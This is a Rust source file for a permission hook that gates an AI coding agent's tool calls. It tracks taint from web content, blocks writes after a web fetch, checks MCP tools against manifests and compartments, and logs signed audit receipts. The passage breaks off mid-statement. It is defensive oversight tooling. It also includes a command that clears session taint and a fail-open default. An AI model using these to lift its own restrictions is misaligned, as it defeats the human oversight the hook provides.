//! Claude Code PreToolUse hook backed by the Nucleus verified permission kernel.
//!
//! This binary reads JSON from stdin (Claude Code hook protocol), runs the
//! operation through `portcullis::kernel::Kernel`, and writes JSON to stdout.
//!
//! Session state is persisted to a JSON file under `/tmp/` so that exposure
//! tracking accumulates across hook invocations within the same session.

use std::io::{self, BufRead, Write};

use portcullis::kernel::{Kernel, Verdict};
use portcullis::manifest_registry::ManifestRegistry;
use portcullis::receipt_sign::{receipt_hash, sign_receipt};
use portcullis::{Operation, PermissionLattice};
use portcullis_core::flow::NodeKind;
use portcullis_core::receipt::build_receipt;
use ring::rand::SystemRandom;
use ring::signature::Ed25519KeyPair;

mod bench;
mod build;
mod classify;
mod cli;
mod color;
mod completions;
mod context;
mod denial;
mod exit_codes;
mod help;
mod init;
mod protocol;
mod receipts;
mod session;
mod status;
mod web_taint;

use classify::*;
use color::{nucleus_allow, nucleus_deny, nucleus_info, nucleus_warn};
use denial::format_denial_for_user;
use protocol::{HookInput, HookOutput};
use receipts::{persist_receipt, persist_transition_receipt, show_receipts};
use session::{
    compartment_file_path, gc_stale_sessions, generate_compartment_token, keyed_compartment_name,
    load_session, resolve_compartment, run_gc, sanitize_session_id, save_session, session_dir,
    session_hwm_path, session_state_path, SessionLoad, MANIFEST_VIOLATION_REVOKE_THRESHOLD,
    SESSION_GC_TTL_SECS,
};

use context::{current_fingerprint, maybe_build_context};

// ---------------------------------------------------------------------------
// Profile resolution
// ---------------------------------------------------------------------------

/// Known profiles and their constructors.
fn resolve_profile(name: &str) -> Option<PermissionLattice> {
    match name {
        "read_only" => Some(PermissionLattice::read_only()),
        "code_review" => Some(PermissionLattice::code_review()),
        "edit_only" => Some(PermissionLattice::edit_only()),
        "fix_issue" => Some(PermissionLattice::fix_issue()),
        "safe_pr_fixer" => Some(PermissionLattice::safe_pr_fixer()),
        "release" => Some(PermissionLattice::release()),
        "permissive" => Some(PermissionLattice::permissive()),
        _ => None,
    }
}

/// Load config from `.nucleus/config.toml` (#550).
///
/// Example config.toml:
/// ```toml
/// profile = "safe_pr_fixer"
/// compartment = "research"
/// fail_closed = false
/// require_manifests = true
/// ```
///
/// Priority: env var > config file > default.
pub(crate) fn load_config_file() -> std::collections::HashMap<String, String> {
    let mut config = std::collections::HashMap::new();

    let config_paths = [
        std::env::current_dir()
            .ok()
            .map(|d| d.join(".nucleus").join("config.toml")),
        dirs_next::home_dir().map(|d| d.join(".nucleus").join("config.toml")),
    ];

    for path in config_paths.iter().flatten() {
        if let Ok(content) = std::fs::read_to_string(path) {
            if let Ok(table) = content.parse::<toml::Table>() {
                for (key, value) in &table {
                    if let Some(s) = value.as_str() {
                        config.insert(key.clone(), s.to_string());
                    } else if let Some(b) = value.as_bool() {
                        config.insert(key.clone(), if b { "1" } else { "0" }.to_string());
                    }
                }
            }
            break;
        }
    }

    config
}

fn default_profile_name() -> String {
    // Check env var first, then config file, then default
    if let Ok(p) = std::env::var("NUCLEUS_PROFILE") {
        return p;
    }
    let config = load_config_file();
    if let Some(p) = config.get("profile") {
        return p.clone();
    }
    "safe_pr_fixer".to_string()
}

const PROFILES: &[&str] = &[
    "read_only",
    "code_review",
    "edit_only",
    "fix_issue",
    "safe_pr_fixer",
    "release",
    "permissive",
];

// ---------------------------------------------------------------------------
// --setup: auto-configure Claude Code settings.json
// ---------------------------------------------------------------------------

fn run_setup() {
    let home = dirs_next::home_dir().expect("cannot determine home directory");
    let settings_dir = home.join(".claude");
    std::fs::create_dir_all(&settings_dir).expect("cannot create ~/.claude");
    let settings_path = settings_dir.join("settings.json");

    // Read existing settings or create empty object
    let mut settings: serde_json::Value = std::fs::read_to_string(&settings_path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_else(|| serde_json::json!({}));

    // Find the binary path
    let binary = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| "nucleus-claude-hook".to_string());

    // Set up PreToolUse hook — PRESERVE existing hooks (#546)
    let hooks = settings
        .as_object_mut()
        .unwrap()
        .entry("hooks")
        .or_insert_with(|| serde_json::json!({}));
    let hooks_obj = hooks.as_object_mut().unwrap();

    let nucleus_entry = serde_json::json!({
        "matcher": "",
        "hooks": [
            {
                "type": "command",
                "command": binary
            }
        ]
    });

    if let Some(existing) = hooks_obj.get_mut("PreToolUse") {
        if let Some(arr) = existing.as_array_mut() {
            // Check if nucleus is already configured
            let already_present = arr.iter().any(|entry| {
                entry
                    .get("hooks")
                    .and_then(|h| h.as_array())
                    .map(|hooks| {
                        hooks.iter().any(|h| {
                            h.get("command")
                                .and_then(|c| c.as_str())
                                .map(|s| s.contains("nucleus-claude-hook"))
                                .unwrap_or(false)
                        })
                    })
                    .unwrap_or(false)
            });

            if already_present {
                // Update the existing nucleus entry's command path
                for entry in arr.iter_mut() {
                    if let Some(hooks) = entry.get_mut("hooks").and_then(|h| h.as_array_mut()) {
                        for hook in hooks.iter_mut() {
                            if hook
                                .get("command")
                                .and_then(|c| c.as_str())
                                .map(|s| s.contains("nucleus-claude-hook"))
                                .unwrap_or(false)
                            {
                                hook.as_object_mut()
                                    .unwrap()
                                    .insert("command".to_string(), serde_json::json!(binary));
                            }
                        }
                    }
                }
                eprintln!("nucleus: updated existing hook path");
            } else {
                // Append — preserve existing hooks
                arr.push(nucleus_entry);
                eprintln!(
                    "nucleus: added nucleus hook (preserved {} existing hook(s))",
                    arr.len() - 1
                );
            }
        } else {
            // PreToolUse exists but isn't an array — replace
            hooks_obj.insert("PreToolUse".to_string(), serde_json::json!([nucleus_entry]));
        }
    } else {
        // No existing PreToolUse — create fresh
        hooks_obj.insert("PreToolUse".to_string(), serde_json::json!([nucleus_entry]));
    }

    let json = serde_json::to_string_pretty(&settings).expect("failed to serialize settings");
    std::fs::write(&settings_path, json).expect("failed to write settings.json");

    eprintln!(
        "nucleus: configured PreToolUse hook in {}",
        settings_path.display()
    );
    eprintln!(
        "nucleus: profile = {} (set NUCLEUS_PROFILE to change)",
        default_profile_name()
    );
}

// (--status handler moved to status.rs)

// ---------------------------------------------------------------------------
// --help
// ---------------------------------------------------------------------------

fn run_smoke_test() {
    use std::process::Command;

    println!("nucleus smoke test — verifying hook works correctly\n");

    let binary = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| "nucleus-claude-hook".to_string());

    let session_id = format!("smoke-test-{}", std::process::id());
    let mut passed = 0u32;
    let mut failed = 0u32;

    // Test 1: Read should be allowed
    let input1 = format!(
        r#"{{"session_id":"{session_id}","tool_name":"Read","tool_input":{{"file_path":"/etc/hostname"}}}}"#
    );
    let out1 = Command::new(&binary)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.take().unwrap().write_all(input1.as_bytes())?;
            child.wait_with_output()
        });

    match out1 {
        Ok(output) if output.status.success() => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("\"allow\"") {
                println!("  \x1b[32m\u{2713}\x1b[0m Read file → allowed");
                passed += 1;
            } else {
                println!(
                    "  \x1b[31m\u{2717}\x1b[0m Read file → unexpected: {}",
                    stdout.trim()
                );
                failed += 1;
            }
        }
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            println!(
                "  \x1b[31m\u{2717}\x1b[0m Read file → failed (exit {}): {}",
                output.status,
                stdout.trim()
            );
            failed += 1;
        }
        Err(e) => {
            println!("  \x1b[31m\u{2717}\x1b[0m Read file → error: {e}");
            failed += 1;
        }
    }

    // Test 2: WebFetch should be allowed (but taints)
    let input2 = format!(
        r#"{{"session_id":"{session_id}","tool_name":"WebFetch","tool_input":{{"url":"https://example.com"}}}}"#
    );
    let out2 = Command::new(&binary)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.take().unwrap().write_all(input2.as_bytes())?;
            child.wait_with_output()
        });

    match out2 {
        Ok(output) if output.status.success() => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("\"allow\"") {
                println!("  \x1b[32m\u{2713}\x1b[0m WebFetch → allowed (session tainted)");
                passed += 1;
            } else {
                println!(
                    "  \x1b[31m\u{2717}\x1b[0m WebFetch → unexpected: {}",
                    stdout.trim()
                );
                failed += 1;
            }
        }
        _ => {
            println!("  \x1b[31m\u{2717}\x1b[0m WebFetch → failed");
            failed += 1;
        }
    }

    // Test 3: Write after web fetch should be DENIED
    let input3 = format!(
        r#"{{"session_id":"{session_id}","tool_name":"Write","tool_input":{{"file_path":"/tmp/test","content":"x"}}}}"#
    );
    let out3 = Command::new(&binary)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.take().unwrap().write_all(input3.as_bytes())?;
            child.wait_with_output()
        });

    match out3 {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("\"deny\"") {
                println!(
                    "  \x1b[32m\u{2713}\x1b[0m Write after taint → denied (flow control working!)"
                );
                passed += 1;
            } else {
                println!(
                    "  \x1b[31m\u{2717}\x1b[0m Write after taint → should be denied but got: {}",
                    stdout.trim()
                );
                failed += 1;
            }
        }
        Err(e) => {
            // Exit code 2 = deny, which is correct
            println!("  \x1b[32m\u{2713}\x1b[0m Write after taint → denied (exit 2)");
            let _ = e;
            passed += 1;
        }
    }

    // Clean up smoke test session
    let state_path = session_state_path(&session_id);
    let hwm_path = session_hwm_path(&session_id);
    std::fs::remove_file(&state_path).ok();
    std::fs::remove_file(&hwm_path).ok();
    let receipts_dir = session_dir().join("receipts");
    let receipt_path = receipts_dir.join(format!("{}.jsonl", sanitize_session_id(&session_id)));
    std::fs::remove_file(&receipt_path).ok();

    println!();
    if failed == 0 {
        println!(
            "\x1b[32m{passed}/{} tests passed — hook is working correctly.\x1b[0m",
            passed + failed
        );
    } else {
        println!(
            "\x1b[31m{passed}/{} tests passed, {failed} failed.\x1b[0m",
            passed + failed
        );
        exit_codes::ExitCode::Error.exit();
    }
}

fn run_init() {
    init::run_init();
}

fn run_uninstall() {
    println!("Removing nucleus-claude-hook from Claude Code...\n");

    // 1. Remove hook from settings.json
    if let Some(home) = dirs_next::home_dir() {
        let settings_path = home.join(".claude").join("settings.json");
        if settings_path.exists() {
            if let Ok(content) = std::fs::read_to_string(&settings_path) {
                if let Ok(mut settings) = serde_json::from_str::<serde_json::Value>(&content) {
                    if let Some(hooks) = settings.get_mut("hooks").and_then(|h| h.as_object_mut()) {
                        if let Some(pre_tool) = hooks.get_mut("PreToolUse") {
                            if let Some(arr) = pre_tool.as_array_mut() {
                                let before = arr.len();
                                arr.retain(|entry| {
                                    !entry
                                        .get("hooks")
                                        .and_then(|h| h.as_array())
                                        .map(|hooks| {
                                            hooks.iter().any(|h| {
                                                h.get("command")
                                                    .and_then(|c| c.as_str())
                                                    .map(|s| s.contains("nucleus-claude-hook"))
                                                    .unwrap_or(false)
                                            })
                                        })
                                        .unwrap_or(false)
                                });
                                if arr.len() < before {
                                    if arr.is_empty() {
                                        hooks.remove("PreToolUse");
                                    }
                                    if let Ok(json) = serde_json::to_string_pretty(&settings) {
                                        std::fs::write(&settings_path, json).ok();
                                    }
                                    println!(
                                        "  \x1b[32m\u{2713}\x1b[0m Removed hook from {}",
                                        settings_path.display()
                                    );
                                } else {
                                    println!("  - Hook not found in {}", settings_path.display());
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // 2. Clean up session state
    let sess_dir = session_dir();
    if sess_dir.exists() {
        let count = std::fs::read_dir(&sess_dir).map(|e| e.count()).unwrap_or(0);
        if count > 0 {
            println!(
                "  \x1b[33m!\x1b[0m Session data at {} ({count} files)",
                sess_dir.display()
            );
            println!("    Remove with: rm -rf {}", sess_dir.display());
        }
    }

    println!("\n  To remove the binary:");
    println!("    cargo uninstall nucleus-claude-hook");
    println!("\n  Restart Claude Code to deactivate.");
}

fn run_doctor() {
    let mut ok = true;

    // 1. Check settings.json
    let home = dirs_next::home_dir();
    let settings_path = home
        .as_ref()
        .map(|h| h.join(".claude").join("settings.json"));

    if let Some(ref path) = settings_path {
        if path.exists() {
            if let Ok(content) = std::fs::read_to_string(path) {
                if content.contains("nucleus-claude-hook") {
                    println!(
                        "\x1b[32m\u{2713}\x1b[0m Hook configured in {}",
                        path.display()
                    );
                } else {
                    println!(
                        "\x1b[31m\u{2717}\x1b[0m Hook NOT configured in {} — run --setup",
                        path.display()
                    );
                    ok = false;
                }
            }
        } else {
            println!(
                "\x1b[31m\u{2717}\x1b[0m Settings file not found: {} — run --setup",
                path.display()
            );
            ok = false;
        }
    }

    // 2. Check session directory
    let sess_dir = session_dir();
    if sess_dir.exists() {
        let count = std::fs::read_dir(&sess_dir)
            .map(|entries| entries.count())
            .unwrap_or(0);
        println!(
            "\x1b[32m\u{2713}\x1b[0m Session directory: {} ({count} files)",
            sess_dir.display()
        );
    } else {
        println!("\x1b[33m-\x1b[0m Session directory not yet created (first run pending)");
    }

    // 3. Check profile
    let profile = default_profile_name();
    if resolve_profile(&profile).is_some() {
        println!("\x1b[32m\u{2713}\x1b[0m Active profile: {profile}");
    } else {
        println!(
            "\x1b[31m\u{2717}\x1b[0m Unknown profile: {profile} — will fall back to safe_pr_fixer"
        );
        ok = false;
    }

    // 4. Check compartment env
    if let Ok(comp) = std::env::var("NUCLEUS_COMPARTMENT") {
        if portcullis_core::compartment::Compartment::from_str_opt(&comp).is_some() {
            println!("\x1b[32m\u{2713}\x1b[0m Compartment: {comp}");
        } else {
            println!("\x1b[31m\u{2717}\x1b[0m Invalid NUCLEUS_COMPARTMENT: {comp}");
            ok = false;
        }
    } else {
        println!("\x1b[33m-\x1b[0m No compartment set (using profile defaults)");
    }

    // 5. Check receipt directory
    let receipt_dir = sess_dir.join("receipts");
    if receipt_dir.exists() {
        let count = std::fs::read_dir(&receipt_dir)
            .map(|entries| entries.count())
            .unwrap_or(0);
        println!("\x1b[32m\u{2713}\x1b[0m Receipt chains: {count} sessions");
    } else {
        println!("\x1b[33m-\x1b[0m No receipt chains yet");
    }

    // 6. Version
    println!(
        "\x1b[32m\u{2713}\x1b[0m Version: {}",
        env!("CARGO_PKG_VERSION")
    );

    println!();
    if ok {
        println!("\x1b[32mAll checks passed.\x1b[0m");
    } else {
        println!("\x1b[31mSome checks failed.\x1b[0m Run --setup to configure.");
    }
}

fn show_profile(name: &str) {
    let perms = match resolve_profile(name) {
        Some(p) => p,
        None => {
            println!("Unknown profile: '{name}'");
            println!("Available: {}", PROFILES.join(", "));
            return;
        }
    };

    println!("Profile: {name}");
    println!("{}", perms.description);
    println!();
    println!("Capabilities:");

    let caps = &perms.capabilities;
    let fmt = |level: portcullis_core::CapabilityLevel| match level {
        portcullis_core::CapabilityLevel::Never => "\x1b[31mNever\x1b[0m",
        portcullis_core::CapabilityLevel::LowRisk => "\x1b[33mLowRisk\x1b[0m",
        portcullis_core::CapabilityLevel::Always => "\x1b[32mAlways\x1b[0m",
    };

    println!("  read_files:   {}", fmt(caps.read_files));
    println!("  write_files:  {}", fmt(caps.write_files));
    println!("  edit_files:   {}", fmt(caps.edit_files));
    println!("  run_bash:     {}", fmt(caps.run_bash));
    println!("  glob_search:  {}", fmt(caps.glob_search));
    println!("  grep_search:  {}", fmt(caps.grep_search));
    println!("  web_search:   {}", fmt(caps.web_search));
    println!("  web_fetch:    {}", fmt(caps.web_fetch));
    println!("  git_commit:   {}", fmt(caps.git_commit));
    println!("  git_push:     {}", fmt(caps.git_push));
    println!("  create_pr:    {}", fmt(caps.create_pr));
    println!("  manage_pods:  {}", fmt(caps.manage_pods));
    println!("  spawn_agent:  {}", fmt(caps.spawn_agent));
}

fn run_help(topic: Option<String>) {
    match topic.as_deref() {
        Some("compartments") => help::print_help_compartments(),
        Some("flow") => help::print_help_flow(),
        Some("profiles") => help::print_help_profiles(),
        Some(unknown) => {
            eprintln!("Unknown help topic: '{unknown}'");
            eprintln!("Available topics: compartments, flow, profiles");
            eprintln!("Run 'nucleus-claude-hook --help' for general help.");
            std::process::exit(1);
        }
        None => help::print_help(),
    }
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

fn main() {
    let start_time = std::time::Instant::now();
    let args: Vec<String> = std::env::args().collect();

    match cli::parse_args(&args) {
        Ok(cli::CliCommand::Setup) => {
            run_setup();
            return;
        }
        Ok(cli::CliCommand::Status { json }) => {
            status::run_status(json);
            return;
        }
        Ok(cli::CliCommand::Help { topic }) => {
            run_help(topic);
            return;
        }
        Ok(cli::CliCommand::Version) => {
            println!("nucleus-claude-hook {}", env!("CARGO_PKG_VERSION"));
            return;
        }
        Ok(cli::CliCommand::Compartment { name }) => {
            session::switch_compartment(&name);
            return;
        }
        Ok(cli::CliCommand::CompartmentPath { session_id }) => {
            println!("{}", compartment_file_path(&session_id).display());
            return;
        }
        Ok(cli::CliCommand::ResetSession { session_id }) => {
            let state_path = session_state_path(&session_id);
            let hwm_path = session_hwm_path(&session_id);
            if state_path.exists() {
                std::fs::remove_file(&state_path).ok();
                std::fs::remove_file(&hwm_path).ok();
                println!("nucleus: session '{session_id}' reset — taint cleared");
                println!("nucleus: Note: receipt chain preserved for audit");
            } else {
                println!("nucleus: no session found for '{session_id}'");
            }
            return;
        }
        Ok(cli::CliCommand::Init) => {
            run_init();
            return;
        }
        Ok(cli::CliCommand::Build) => {
            build::run_build(&args);
            return;
        }
        Ok(cli::CliCommand::Uninstall) => {
            run_uninstall();
            return;
        }
        Ok(cli::CliCommand::Doctor) => {
            run_doctor();
            return;
        }
        Ok(cli::CliCommand::SmokeTest) => {
            run_smoke_test();
            return;
        }
        Ok(cli::CliCommand::Gc) => {
            run_gc();
            return;
        }
        Ok(cli::CliCommand::ShowProfile { name }) => {
            if let Some(name) = name {
                show_profile(&name);
            } else {
                println!("Available profiles:");
                for p in PROFILES {
                    println!("  {p}");
                }
                println!("\nUsage: nucleus-claude-hook --show-profile <name>");
            }
            return;
        }
        Ok(cli::CliCommand::Receipts { session_id }) => {
            if let Some(session_id) = session_id {
                show_receipts(&session_id);
            } else {
                let receipts_dir = session_dir().join("receipts");
                if receipts_dir.exists() {
                    println!("Receipt chains:");
                    if let Ok(entries) = std::fs::read_dir(&receipts_dir) {
                        for entry in entries.flatten() {
                            if entry.path().extension().is_some_and(|e| e == "jsonl") {
                                let name = entry
                                    .path()
                                    .file_stem()
                                    .map(|s| s.to_string_lossy().to_string())
                                    .unwrap_or_default();
                                let lines = std::fs::read_to_string(entry.path())
                                    .map(|c| c.lines().count())
                                    .unwrap_or(0);
                                println!("  {name}  ({lines} receipts)");
                            }
                        }
                    }
                } else {
                    println!("No receipt chains found.");
                }
                println!("\nUsage: nucleus-claude-hook --receipts <session-id>");
            }
            return;
        }
        Ok(cli::CliCommand::Completions { shell }) => {
            match completions::generate_completions(&shell) {
                Some(script) => {
                    print!("{script}");
                }
                None => {
                    eprintln!(
                        "nucleus-claude-hook: unsupported shell '{shell}'. \
                         Supported: bash, zsh, fish"
                    );
                    exit_codes::ExitCode::Error.exit();
                }
            }
            return;
        }
        Ok(cli::CliCommand::ExitCodes) => {
            exit_codes::ExitCode::print_docs();
            return;
        }
        Ok(cli::CliCommand::Benchmark { iterations }) => {
            bench::run_benchmark(bench::BenchConfig { iterations });
            return;
        }
        Ok(cli::CliCommand::StatusLine) => {
            status::run_statusline();
            return;
        }
        Err(e) => {
            eprintln!("nucleus-claude-hook: {e}");
            exit_codes::ExitCode::Error.exit();
        }
        Ok(cli::CliCommand::Hook) => {} // fall through to stdin processing
    }

    // Read hook input from stdin.
    //
    // ERROR MODEL: Infrastructure errors (no stdin, bad JSON) are NON-BLOCKING.
    // Exit 0 with no JSON → Claude Code falls through to normal behavior (asks user).
    // Only INTENTIONAL denials (flow violations, capability checks, tamper) use exit 2.
    // This means a broken/crashing hook doesn't brick the session — it gracefully
    // degrades to standard Claude Code permission prompts.
    //
    // For production/CISO mode: set NUCLEUS_FAIL_CLOSED=1 to make infrastructure
    // errors blocking (exit 2). This is the paranoid setting.
    let fail_closed = std::env::var("NUCLEUS_FAIL_CLOSED")
        .map(|v| v == "1")
        .unwrap_or(false);

    let stdin = io::stdin();
    let line = match stdin.lock().lines().next() {
        Some(Ok(line)) => line,
        _ => {
            eprintln!("nucleus: no input on stdin — falling through to Claude Code defaults");
            if fail_closed {
                let out = HookOutput::deny(
                    "nucleus: no hook input — failing closed (NUCLEUS_FAIL_CLOSED=1)",
                );
                println!("{}", serde_json::to_string(&out).unwrap());
                exit_codes::ExitCode::Deny.exit();
            }
            // Non-blocking: exit 0 with no JSON → Claude Code asks user normally
            return;
        }
    };

    let input: HookInput = match serde_json::from_str(&line) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("nucleus: parse error: {e} — falling through to Claude Code defaults");
            if fail_closed {
                let out = HookOutput::deny(format!("nucleus: parse error — failing closed: {e}"));
                println!("{}", serde_json::to_string(&out).unwrap());
                exit_codes::ExitCode::Deny.exit();
            }
            // Non-blocking: exit 0 with no JSON → Claude Code asks user normally
            return;
        }
    };

    // Handle non-PreToolUse events
    if input.hook_event_name != "PreToolUse" {
        // SessionEnd: seal receipt chain and clean up (#499)
        if input.hook_event_name == "SessionEnd" {
            if let SessionLoad::Loaded(session) = load_session(&input.session_id) {
                let chain_hash = hex::encode(session.chain_head_hash);
                let op_count = session.allowed_ops.len();
                nucleus_info!("session ended — {op_count} operations, chain hash: {chain_hash}");

                persist_transition_receipt(
                    &input.session_id,
                    session.active_compartment.as_deref(),
                    "session_end",
                    "finalized",
                );

                // Clean up session state (keep receipts for audit)
                let state_path = session_state_path(&input.session_id);
                let hwm_path = session_hwm_path(&input.session_id);
                std::fs::remove_file(&state_path).ok();
                std::fs::remove_file(&hwm_path).ok();
                if !session.compartment_token.is_empty() {
                    let keyed =
                        keyed_compartment_name(&input.session_id, &session.compartment_token);
                    let comp_path = session_dir().join(format!("{keyed}.compartment"));
                    std::fs::remove_file(&comp_path).ok();
                }
                nucleus_info!("session state cleaned up (receipts preserved)");

                // Opportunistic GC: clean up stale sessions from other
                // sessions that didn't get a SessionEnd event (#520).
                // Use a simple hash of session_id to get ~10% probability.
                let gc_trigger: u8 = input
                    .session_id
                    .bytes()
                    .fold(0u8, |acc, b| acc.wrapping_add(b));
                if gc_trigger % 10 == 0 {
                    let removed = gc_stale_sessions(SESSION_GC_TTL_SECS);
                    if removed > 0 {
                        nucleus_info!("gc — removed {removed} stale session file(s)");
                    }
                }
            }
        }
        // PostToolUse: observe the tool result and insert into flow graph (#593, #497)
        if input.hook_event_name == "PostToolUse" && !input.tool_name.is_empty() {
            if let Some(ref result_text) = input.tool_result {
                // Check MCP tool output against manifest
                if input.tool_name.starts_with("mcp__") {
                    let cwd = std::env::current_dir().unwrap_or_default();
                    let registry =
                        portcullis::manifest_registry::ManifestRegistry::load_from_dir(&cwd);
                    let mcp_tool_name = input
                        .tool_name
                        .strip_prefix("mcp__")
                        .unwrap_or(&input.tool_name);
                    if let Some(manifest) = registry.get(mcp_tool_name) {
                        let violations = portcullis::manifest_enforcement::check_output(
                            mcp_tool_name,
                            manifest,
                            result_text,
                        );
                        if !violations.is_empty() {
                            for v in &violations {
                                nucleus_warn!(
                                    "MANIFEST VIOLATION — {}: {:?} — {}",
                                    v.tool_name,
                                    v.kind,
                                    v.description
                                );
                            }
                            // Persist violation count in session state (#485).
                            // Trust revocation is monotonic — count only increases.
                            if let SessionLoad::Loaded(ref mut session)
                            | SessionLoad::Fresh(ref mut session) =
                                load_session(&input.session_id)
                            {
                                let count = session
                                    .flagged_tools
                                    .entry(input.tool_name.clone())
                                    .or_insert(0);
                                *count = count.saturating_add(violations.len() as u32);
                                let current = *count;
                                save_session(&input.session_id, session);
                                if current >= MANIFEST_VIOLATION_REVOKE_THRESHOLD {
                                    eprintln!(
                                        "nucleus: tool '{}' has {} violations (threshold {}) — will be DENIED on next use",
                                        input.tool_name, current, MANIFEST_VIOLATION_REVOKE_THRESHOLD
                                    );
                                } else {
                                    eprintln!(
                                        "nucleus: tool '{}' flagged ({}/{} violations before revocation)",
                                        input.tool_name, current, MANIFEST_VIOLATION_REVOKE_THRESHOLD
                                    );
                                }
                            }
                        }
                    }
                }

                // Insert tool output as a ToolResponse observation in the flow graph.
                // This closes the gap where tool outputs were invisible to IFC (#593).
                // The ToolResponse node's kind depends on the tool: web tools produce
                // WebContent (adversarial), file reads produce FileRead (trusted),
                // everything else produces ToolResponse (model-category).
                match load_session(&input.session_id) {
                    SessionLoad::Loaded(mut session) | SessionLoad::Fresh(mut session) => {
                        // Classify the tool output's node kind based on the operation.
                        // The output of a web fetch IS web content (adversarial).
                        // The output of a file read IS file content (trusted).
                        // Everything else is a generic tool response (model category).
                        let op = map_tool(&input.tool_name);
                        let output_kind = classify_tool_output(op);

                        session.flow_observations.push((
                            node_kind_to_u8(output_kind),
                            format!("post:{op}"),
                            truncate_subject(result_text, 200),
                        ));
                        // Clear the pre-tool index — this PostToolUse is consumed.
                        session.last_pre_tool_obs_index = None;
                        // Web taint detection (#838) — monotonic, never reverts.
                        if web_taint::detect_web_taint(&input.tool_name) && !session.web_tainted {
                            session.web_tainted = true;
                            eprintln!(
                                "{}",
                                web_taint::web_taint_warning(&input.tool_name, result_text)
                            );
                        }
                        save_session(&input.session_id, &session);

                        eprintln!(
                            "nucleus: post-tool {op} {} — inserted {:?} observation into flow graph",
                            input.tool_name, output_kind
                        );
                    }
                    SessionLoad::Tampered { .. } => {
                        nucleus_deny!("post-tool skipped — session tampered");
                    }
                }
            }
        }

        // SubagentStart: export parent's taint label + compartment (#498)
        if input.hook_event_name == "SubagentStart" {
            if let SessionLoad::Loaded(session) | SessionLoad::Fresh(session) =
                load_session(&input.session_id)
            {
                let agent_name = input.tool_name.as_str();
                eprintln!(
                    "nucleus: subagent started: {} (parent compartment: {})",
                    if agent_name.is_empty() {
                        "unnamed"
                    } else {
                        agent_name
                    },
                    session.active_compartment.as_deref().unwrap_or("none"),
                );

                // Export parent label for the child agent
                let safe_id = sanitize_session_id(&input.session_id);
                let label_path = session_dir().join(format!("{safe_id}.parent-label"));
                if label_path.exists() {
                    eprintln!("nucleus: parent label exported at {}", label_path.display());
                }

                // Record in receipt chain
                persist_transition_receipt(
                    &input.session_id,
                    session.active_compartment.as_deref(),
                    &format!(
                        "subagent_start:{}",
                        if agent_name.is_empty() {
                            "unnamed"
                        } else {
                            agent_name
                        }
                    ),
                    "spawned",
                );
            }
        }

        // SubagentStop: log child completion (#498)
        if input.hook_event_name == "SubagentStop" {
            let agent_name = input.tool_name.as_str();
            eprintln!(
                "nucleus: subagent stopped: {}",
                if agent_name.is_empty() {
                    "unnamed"
                } else {
                    agent_name
                },
            );

            // Record in receipt chain
            if let SessionLoad::Loaded(session) | SessionLoad::Fresh(session) =
                load_session(&input.session_id)
            {
                persist_transition_receipt(
                    &input.session_id,
                    session.active_compartment.as_deref(),
                    &format!(
                        "subagent_stop:{}",
                        if agent_name.is_empty() {
                            "unnamed"
                        } else {
                            agent_name
                        }
                    ),
                    "completed",
                );
            }
        }

        // Other events — pass through
        return;
    }

    // Map tool to operation — every tool is gated, no passthrough
    let operation = map_tool(&input.tool_name);

    // Check MCP tools against manifest registry (admission control).
    // Loads manifests from .nucleus/manifests/*.toml in the working directory.
    if input.tool_name.starts_with("mcp__") {
        let cwd = std::env::current_dir().unwrap_or_default();
        let registry = ManifestRegistry::load_from_dir(&cwd);
        // Extract tool name: mcp__server__tool → server__tool
        let mcp_tool_name = input
            .tool_name
            .strip_prefix("mcp__")
            .unwrap_or(&input.tool_name);
        if let Some(reason) = registry.is_rejected(mcp_tool_name) {
            let out = HookOutput::deny(format!(
                "Blocked: MCP tool '{mcp_tool_name}' rejected by manifest admission: {reason:?}"
            ));
            nucleus_deny!(
                "{} rejected by manifest admission: {:?}",
                input.tool_name,
                reason
            );
            println!("{}", serde_json::to_string(&out).unwrap());
            exit_codes::ExitCode::Deny.exit();
        }

        // SECURITY (#512): Default-deny unmanifested MCP tools.
        // When NUCLEUS_REQUIRE_MANIFESTS=1, any MCP tool without a manifest
        // in .nucleus/manifests/ is denied. This prevents tools that fetch
        // instructions or executable content from unlabeled origins.
        let require_manifests = std::env::var("NUCLEUS_REQUIRE_MANIFESTS")
            .map(|v| v == "1")
            .unwrap_or(false);
        if require_manifests && registry.get(mcp_tool_name).is_none() {
            let out = HookOutput::deny(format!(
                "Blocked: MCP tool '{mcp_tool_name}' has no manifest. \
                 Add a manifest to .nucleus/manifests/ or run \
                 'nucleus manifest init --server {}'.",
                mcp_tool_name.split("__").next().unwrap_or(mcp_tool_name)
            ));
            nucleus_deny!(
                "{} denied — no manifest (NUCLEUS_REQUIRE_MANIFESTS=1)",
                input.tool_name
            );
            println!("{}", serde_json::to_string(&out).unwrap());
            exit_codes::ExitCode::Deny.exit();
        }

        // SECURITY (#462): Check if the tool is allowed in the current compartment.
        // A manifest with `allowed_compartments = ["research"]` blocks the tool
        // in draft/execute/breakglass.
        if let Some(manifest) = registry.get(mcp_tool_name) {
            if let Ok(comp_str) = std::env::var("NUCLEUS_COMPARTMENT") {
                let comp_name = comp_str.split(':').next().unwrap_or(&comp_str);
                if !manifest.is_allowed_in_compartment(comp_name) {
                    let out = HookOutput::deny(format!(
                        "Blocked: MCP tool '{mcp_tool_name}' is not allowed in \
                         compartment '{comp_name}'. Allowed in: {}.\n  \
                         How to fix:\n  \
                         - Switch to an allowed compartment\n  \
